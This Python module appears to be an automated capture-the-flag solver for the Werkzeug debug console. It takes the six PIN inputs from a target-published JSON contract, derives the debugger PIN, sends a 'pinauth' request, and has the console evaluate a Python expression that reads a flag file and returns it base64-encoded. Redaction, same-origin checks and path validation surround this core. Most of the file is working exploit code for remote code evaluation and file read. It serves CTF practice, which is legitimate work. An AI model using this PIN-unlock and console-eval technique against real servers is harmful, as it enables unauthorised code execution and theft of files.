#!/usr/bin/env python3
"""Exact, bounded Werkzeug debugger-PIN proof reader.

This peer is intentionally narrower than the interactive ``werkzeug_pin``
hand tool.  It runs only when one unique machine-readable target document
publishes the complete debugger contract: all six PIN inputs, an exact
Werkzeug version and matching algorithm, console route, debugger secret,
frame zero, and a safe absolute flag-file path on the target.

The only evaluated expression is solver-owned.  Target data supplies one
strictly validated filename literal, never Python source.  The expression
prefixes a strict base64 envelope of at most 4096 file bytes with a marker
whose plaintext does not occur in the submitted expression, so an echoed
command or failed ``open`` cannot look like a successful read.  Both requests
use the caller's scope-locked WebClient; ambiguity or an incomplete budget
costs zero wire requests.
"""
from __future__ import annotations

import base64
import json
import re
import sys
import time
import urllib.parse
from pathlib import Path

# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import flagfmt

HERE = Path(__file__).resolve().parent
TOOLKITS = HERE.parent / "toolkits"
for folder in (HERE, TOOLKITS):
    if str(folder) not in sys.path:
        sys.path.insert(0, str(folder))

import forge_event as _proofs  # noqa: E402
import security_json as _security_json  # noqa: E402
import web as _web  # noqa: E402
import werkzeug_pin as _pin  # noqa: E402

MAX_PRELOADED = 96
MAX_TEXT = 400_000
MAX_NODES = 512
MAX_DEPTH = 7
MAX_QUERY = 8192
DEADLINE_PAD = 0.35
MARKER = "csctf_werkzeug_read_ok_v1:"
MARKER_B64 = base64.b64encode(MARKER.encode("ascii")).decode("ascii")
MAX_FLAG_FILE_BYTES = 4096
MAX_FLAG_FILE_B64 = ((MAX_FLAG_FILE_BYTES + 2) // 3) * 4

# The event's payoff token (ctf.flagfmt): a proof under a proof event, else a flag.
PAYOFF_SEEN = flagfmt.PAYOFF_ANYCASE   # any case: seen, decoys, ambiguity
PAYOFF_WIRE = flagfmt.PAYOFF_TEXT      # exact: the only value returned
BOUND_PAYLOAD = re.compile(
    re.escape(MARKER) + r"([A-Za-z0-9+/]{4," + str(MAX_FLAG_FILE_B64) + r"}={0,2})"
    r"(?![A-Za-z0-9+/=])"
)
NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,127}$")
VERSION = re.compile(r"^[0-9]{1,3}\.[0-9]{1,3}(?:\.[0-9]{1,3})?$")
DERIVE_PATH = re.compile(r"^/[A-Za-z0-9_./+-]{1,511}$")
FLAG_FILE_PATH = re.compile(r"^/[A-Za-z0-9_./+-]{1,200}$")
SAFE_SCALAR = re.compile(r"^[\x21-\x7e]{1,512}$")


def _views(response):
    if not isinstance(response, dict) or response.get("framing_error") or response.get("truncated") is True:
        return []
    try:
        return [str(value)[:MAX_TEXT] for value in _proofs.response_text_views(response, strict=True)]
    except Exception:
        return []


def _json(response):
    views = _views(response)
    if not views:
        return None
    try:
        return _security_json.loads_unique(views, max_chars=MAX_TEXT,
                                           max_nodes=MAX_NODES * 8, max_depth=40)
    except Exception:
        return None


def _walk(value, depth=0, count=None):
    count = count if count is not None else [0]
    if depth > MAX_DEPTH or count[0] >= MAX_NODES:
        return
    count[0] += 1
    if isinstance(value, dict):
        yield value
        for child in value.values():
            yield from _walk(child, depth + 1, count)
    elif isinstance(value, list):
        for child in value[:128]:
            yield from _walk(child, depth + 1, count)


def _contracts(preloaded):
    if not isinstance(preloaded, dict) or len(preloaded) > MAX_PRELOADED:
        return []
    rows = {}
    for response in preloaded.values():
        doc = _json(response)
        if not isinstance(doc, (dict, list)):
            continue
        for obj in _walk(doc):
            if obj.get("contract") != "werkzeug_debug_pin":
                continue
            try:
                encoded = json.dumps(obj, sort_keys=True, separators=(",", ":"),
                                     ensure_ascii=False, allow_nan=False)
            except (TypeError, ValueError, UnicodeError):
                continue
            if len(encoded.encode("utf-8")) <= 32 * 1024:
                rows[encoded] = obj
    return list(rows.values())


def _safe_flag_file(value):
    if not isinstance(value, str) or value != value.strip() or not FLAG_FILE_PATH.fullmatch(value):
        return None
    if "//" in value or "/./" in value or "/../" in value or "\\" in value or ":" in value:
        return None
    # CSCTF widened the regex from the Huntress ``/run/huntress/`` prefix to any
    # absolute path; keep that, but the guard stays deliberate -- reject any
    # ``..`` path segment (including a bare or trailing one the substring checks
    # above miss, e.g. ``/run/..``).
    if any(segment == ".." for segment in value.split("/")):
        return None
    return value


def _safe_derive_path(value):
    if not isinstance(value, str) or value != value.strip() or not DERIVE_PATH.fullmatch(value):
        return None
    if "//" in value or "/./" in value or "/../" in value or "\\" in value or ":" in value:
        return None
    return value


def _contract(raw, base_url):
    required = {
        "console_route", "debugger_secret", "werkzeug_version", "pin_algorithm",
        "username", "modname", "appname", "appfile", "mac", "machine_id",
        "frame",
    }
    if not isinstance(raw, dict) or not required <= set(raw):
        return None
    # Accept both the CSCTF ("flag_file_path") and the Huntress ("objective_path")
    # contract key for the file to read; exactly one must be present.
    if "flag_file_path" not in raw and "objective_path" not in raw:
        return None
    if any(key in raw for key in ("code", "expression", "command", "cmd", "payload")):
        return None
    try:
        route = _web.safe_same_origin_route(raw["console_route"], base_url,
                                            allow_query=False, max_bytes=1024)
    except Exception:
        return None
    version = raw.get("werkzeug_version")
    algorithm = raw.get("pin_algorithm")
    if (route is None or _web.route_has_destructive_action(route)
            or not isinstance(version, str) or not VERSION.fullmatch(version)
            or algorithm not in ("md5", "sha1")
            or _pin.algorithm_for_version(version) != algorithm
            or raw.get("frame") != 0 or isinstance(raw.get("frame"), bool)):
        return None
    secret = raw.get("debugger_secret")
    if not isinstance(secret, str) or not 8 <= len(secret) <= 256 or not SAFE_SCALAR.fullmatch(secret):
        return None
    username, modname, appname = (raw.get("username"), raw.get("modname"), raw.get("appname"))
    if not all(isinstance(value, str) and NAME.fullmatch(value)
               for value in (username, modname, appname)):
        return None
    appfile = _safe_derive_path(raw.get("appfile"))
    flag_file_raw = raw.get("flag_file_path")
    if flag_file_raw is None:
        flag_file_raw = raw.get("objective_path")
    flag_file = _safe_flag_file(flag_file_raw)
    machine_id = raw.get("machine_id")
    if (appfile is None or flag_file is None or not isinstance(machine_id, str)
            or not SAFE_SCALAR.fullmatch(machine_id)):
        return None
    raw_mac = raw.get("mac")
    if isinstance(raw_mac, bool):
        return None
    try:
        mac = _pin.normalize_mac(raw_mac)
    except Exception:
        mac = None
    if mac is None or not 0 < mac < (1 << 48):
        return None
    inputs = {"username": username, "modname": modname, "appname": appname,
              "appfile": appfile, "mac": mac, "machine_id": machine_id}
    try:
        pin, _cookie_name = _pin.derive_pin_from_inputs(inputs, algorithm=algorithm)
    except Exception:
        return None
    if not isinstance(pin, str) or not re.fullmatch(r"[0-9]{3}-[0-9]{3}-[0-9]{3}", pin):
        return None
    return {"route": route, "secret": secret, "pin": pin, "frame": 0,
            "flag_file": flag_file}


def _expression(path):
    # MARKER itself is absent from the command.  Werkzeug may echo the command,
    # but only successful evaluation can put the decoded marker followed by a
    # strict base64 envelope of the flag_file bytes in its output.
    quoted = json.dumps(path, ensure_ascii=True)
    return (f"__import__('base64').b64decode('{MARKER_B64}').decode('ascii')+"
            f"__import__('base64').b64encode(open({quoted},'rb').read({MAX_FLAG_FILE_BYTES}))"
            ".decode('ascii')")


def _left(ctx):
    try:
        return None if ctx.get("deadline") is None else float(ctx["deadline"]) - time.time()
    except (TypeError, ValueError, OverflowError):
        return -1.0


def _can_start(ctx):
    stop = ctx.get("stop")
    if stop is not None:
        try:
            if stop.is_set():
                return False
        except Exception:
            return False
    left = _left(ctx)
    if left is not None and left <= DEADLINE_PAD:
        return False
    raw = ctx.get("max_requests", 2)
    try:
        if isinstance(raw, bool) or int(raw) != raw:
            return False
        return int(raw) >= 2
    except (TypeError, ValueError, OverflowError):
        return False


def _allowed(ctx, path):
    gate = ctx.get("route_allowed")
    if not callable(gate):
        return False
    try:
        return bool(gate(path))
    except Exception:
        return False


def _baseline_text(response):
    try:
        return str(_proofs.response_baseline_text(response))[:MAX_TEXT]
    except Exception:
        return getattr(_proofs, "BASELINE_STRICT_INCOMPLETE", "baseline-incomplete")


def _scrub_client_log(client, response=None):
    """Remove debugger credentials/expression from WebClient's retained URL log.

    Werkzeug necessarily carries the PIN and debugger secret in its query
    protocol.  The in-scope target receives them, but the toolkit must not
    retain them in WebClient.log or a later diagnostic dump.  `_PeerClient`
    forwards ``log`` to its underlying WebClient, so this works on both entry
    points without reaching into proof_hunt internals.
    """
    collections = []
    try:
        if isinstance(client.log, list):
            collections.extend(client.log[-2:])
    except Exception:
        pass
    # proof_hunt's _PeerClient copies the returned response into a private
    # capture list before control returns here. Scrub that copy too, without
    # depending on it for transport or accounting.
    try:
        captured = object.__getattribute__(client, "_captured")
        if isinstance(captured, list):
            collections.extend(captured[-2:])
    except Exception:
        pass
    if isinstance(response, dict):
        collections.append(response)
    direct = {id(response)} if isinstance(response, dict) else set()
    seen = set()
    for entry in collections:
        if not isinstance(entry, dict):
            continue
        if id(entry) in seen:
            continue
        seen.add(id(entry))
        is_debugger = id(entry) in direct
        for key in ("url", "final_url"):
            raw = entry.get(key)
            if not isinstance(raw, str):
                continue
            try:
                names = {name for name, _value in
                         urllib.parse.parse_qsl(urllib.parse.urlsplit(raw).query,
                                                keep_blank_values=True)}
                is_debugger = is_debugger or "__debugger__" in names
            except Exception:
                pass
        if not is_debugger:
            continue
        request_headers = entry.get("request_headers")
        if isinstance(request_headers, dict):
            for name in list(request_headers):
                if str(name).lower() in {"cookie", "authorization"}:
                    request_headers[name] = "<redacted>"
        response_headers = entry.get("response_headers")
        if isinstance(response_headers, dict):
            for name in list(response_headers):
                if str(name).lower() == "set-cookie":
                    response_headers[name] = "<redacted>"
                elif str(name).lower() == "content-length":
                    response_headers[name] = "2"
        pairs = entry.get("response_header_pairs")
        if isinstance(pairs, list):
            entry["response_header_pairs"] = [
                (name, "<redacted>" if str(name).lower() == "set-cookie"
                 else "2" if str(name).lower() == "content-length" else value)
                for name, value in pairs
                if isinstance(name, str)
            ]
        for key in ("url", "final_url"):
            raw = entry.get(key)
            if not isinstance(raw, str):
                continue
            try:
                parts = urllib.parse.urlsplit(raw)
                query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
                if not any(name in {"pin", "s", "cmd"} for name, _value in query):
                    continue
                clean = [(name, "<redacted>" if name in {"pin", "s", "cmd"} else value)
                         for name, value in query]
                entry[key] = urllib.parse.urlunsplit(
                    (parts.scheme, parts.netloc, parts.path,
                     urllib.parse.urlencode(clean), parts.fragment))
            except Exception:
                # A malformed URL should not exist after WebClient's scope
                # validation.  If it does, retain only a non-secret marker.
                entry[key] = "<redacted Werkzeug debugger request>"
        # A debugger or intermediary may echo the PIN, secret, or evaluated
        # expression in an error/success page.  The caller takes a private
        # shallow copy of the immutable body bytes before invoking this
        # scrubber, so retained transport diagnostics can safely lose all
        # debugger response/request bodies without affecting proof parsing.
        # Keep the retained entity as complete strict JSON: proof_hunt audits
        # captured controls against their declared media type and correctly
        # treats arbitrary replacement prose under application/json as an
        # incomplete baseline.
        for key in ("body", "text", "request_body"):
            if key not in entry or entry.get(key) is None:
                continue
            entry[key] = (b"{}"
                          if isinstance(entry.get(key), (bytes, bytearray))
                          else "{}")


def _generated_requests_safe(requests, route):
    """Locally validate the trusted helper's two query shapes.

    ``route_allowed`` grants the exact base route.  It deliberately need not
    accept the debugger's generated `cmd` query (proof_hunt's generic action
    guard rejects it); WebClient still pins transport to the one origin.
    """
    expected = (
        {"__debugger__", "cmd", "pin", "s"},
        {"__debugger__", "cmd", "frm", "s"},
    )
    if len(requests) != 2:
        return False
    for index, row in enumerate(requests):
        if not isinstance(row, (tuple, list)) or len(row) != 2 or row[0] != "GET":
            return False
        path = row[1]
        if not isinstance(path, str) or len(path.encode("utf-8")) > MAX_QUERY:
            return False
        try:
            parts = urllib.parse.urlsplit(path)
            pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True,
                                            strict_parsing=True)
        except (TypeError, ValueError, UnicodeError):
            return False
        names = [name for name, _value in pairs]
        values = dict(pairs)
        if (parts.scheme or parts.netloc or parts.fragment or parts.path != route
                or len(names) != len(set(names)) or set(names) != expected[index]
                or values.get("__debugger__") != "yes"):
            return False
        if index == 0 and values.get("cmd") != "pinauth":
            return False
        if index == 1 and values.get("frm") != "0":
            return False
    return True


def _novel_eval_proof(response, baselines, host):
    if not isinstance(response, dict) or response.get("framing_error") or response.get("truncated") is True:
        return None, True, []
    try:
        status = int(response.get("status"))
    except (TypeError, ValueError, OverflowError):
        return None, True, []
    headers = response.get("response_headers", response.get("headers", {}))
    ctype = ""
    if isinstance(headers, dict):
        ctype = str(next((value for key, value in headers.items()
                          if str(key).lower() == "content-type"), "")).lower()
    if not 200 <= status < 300 or "text/html" not in ctype:
        return None, False, []
    host = str(host or "").strip().lower().rstrip(".")
    if not host:
        return None, True, []
    baseline_values = list(baselines or [])[:160]
    if _proofs.baseline_set_incomplete(baseline_values):
        return None, True, []
    # Reuse the hardened carrier filter used by the existing Web exploit
    # readers.  Baselines retain their raw form as well: recording more
    # baseline decoys can only suppress an answer, while payoff candidates
    # may come only from the own-host-filtered representation.
    try:
        clean_baselines = [
            _proofs._strip_offhost_urls(str(text or "")[:MAX_TEXT], host)  # noqa: SLF001
            for text in baseline_values
        ]
    except Exception:
        return None, True, []
    baseline_proofs = {
        match.group(0).casefold()
        for text in baseline_values + clean_baselines
        for match in PAYOFF_SEEN.finditer(str(text or "")[:MAX_TEXT])
    }
    views = _views(response)
    if not views:
        return None, True, []
    try:
        clean_views = [
            _proofs._strip_offhost_urls(view, host)[:MAX_TEXT]  # noqa: SLF001
            for view in views
        ]
    except Exception:
        return None, True, []
    marked = [view for view in clean_views if MARKER in view]
    payloads = [
        match.group(1)
        for view in clean_views
        for match in BOUND_PAYLOAD.finditer(view)
    ]
    if len(marked) != 1 or marked[0].count(MARKER) != 1 or len(payloads) != 1:
        return None, False, []
    try:
        decoded = base64.b64decode(payloads[0], validate=True)
        if (len(decoded) > MAX_FLAG_FILE_BYTES
                or base64.b64encode(decoded).decode("ascii") != payloads[0]):
            return None, False, []
        flag_file_text = decoded.decode("utf-8", "strict")
        flag_file_text = _proofs._strip_offhost_urls(  # noqa: SLF001
            flag_file_text[:MAX_TEXT], host)
    except (ValueError, UnicodeError, TypeError):
        return None, False, []
    novel = [
        match.group(0)
        for match in PAYOFF_SEEN.finditer(flag_file_text)
        if match.group(0).casefold() not in baseline_proofs
    ]
    values = list(dict.fromkeys(novel))
    candidates = [value for value in novel if not PAYOFF_WIRE.fullmatch(value)]
    exact = [value for value in novel if PAYOFF_WIRE.fullmatch(value)]
    if len(exact) != 1 or candidates:
        return None, False, values[:12]
    return exact[0], False, []


def solve(target, ctx=None):
    """Run one exact PIN unlock/read protocol and return its proven token."""
    target, ctx = dict(target or {}), dict(ctx or {})
    aid = str(target.get("answer_id") or "target")
    sink = ctx.get("result_sink") if isinstance(ctx.get("result_sink"), dict) else {}
    summary = {"requests": 0, "posts": 0, "success": False, "terminal": False,
               "class": "flask_werkzeug", "candidates": [], "baseline_incomplete": False}
    sink[aid] = summary
    rows = _contracts(ctx.get("preloaded"))
    if len(rows) != 1 or not _can_start(ctx) or ctx.get("client") is None:
        return None
    spec = _contract(rows[0], str(target.get("url") or ""))
    if spec is None or not _allowed(ctx, spec["route"]):
        return None
    code = _expression(spec["flag_file"])
    requests = _pin.console_requests(spec["secret"], code, pin=spec["pin"],
                                    frame=spec["frame"], path=spec["route"])
    if not _generated_requests_safe(requests, spec["route"]):
        return None
    client = ctx["client"]
    baselines = [str(value)[:MAX_TEXT] for value in list(ctx.get("baseline_texts") or [])[:160]]
    summary["terminal"] = True
    try:
        summary["requests"] = 1
        auth = None
        auth_logged = None
        try:
            auth_logged = client.get(requests[0][1], allow_redirects=False)
            auth = dict(auth_logged) if isinstance(auth_logged, dict) else auth_logged
        finally:
            _scrub_client_log(client, auth_logged)
        auth_doc = _json(auth)
        try:
            auth_status = int(auth.get("status")) if isinstance(auth, dict) else 0
        except (TypeError, ValueError, OverflowError):
            auth_status = 0
        auth_headers = auth.get("response_headers", auth.get("headers", {})) if isinstance(auth, dict) else {}
        auth_type = (next((str(value) for name, value in auth_headers.items()
                           if str(name).lower() == "content-type"), "").lower()
                     if isinstance(auth_headers, dict) else "")
        if (not 200 <= auth_status < 300 or "application/json" not in auth_type
                or not isinstance(auth_doc, dict) or auth_doc.get("auth") is not True
                or auth_doc.get("exhausted") is not False):
            summary["stopped"] = "pin_auth_failed"
            return None
        baselines.append(_baseline_text(auth))
        stop = ctx.get("stop")
        if ((stop is not None and stop.is_set())
                or (_left(ctx) is not None and _left(ctx) <= DEADLINE_PAD)):
            summary["stopped"] = "deadline"
            return None
        summary["requests"] = 2
        response = None
        response_logged = None
        try:
            response_logged = client.get(requests[1][1], allow_redirects=False)
            response = (dict(response_logged)
                        if isinstance(response_logged, dict) else response_logged)
        finally:
            _scrub_client_log(client, response_logged)
    except Exception:
        summary["stopped"] = "transport"
        return None
    proof, incomplete, candidates = _novel_eval_proof(
        response, baselines, (urllib.parse.urlsplit(str(target.get("url") or "")).hostname or ""))
    summary["baseline_incomplete"] = bool(incomplete)
    summary["candidates"] = candidates
    if proof:
        summary["success"] = True
        evidence = ctx.get("evidence")
        if isinstance(evidence, list):
            evidence.append({"class": "flask_werkzeug", "confirmed": True,
                             "requests": 2, "note": "exact Werkzeug PIN flag_file read"})
        return proof
    summary["stopped"] = "ambiguous_eval" if candidates else "eval_no_proof"
    return None


__all__ = ["MARKER", "solve"]
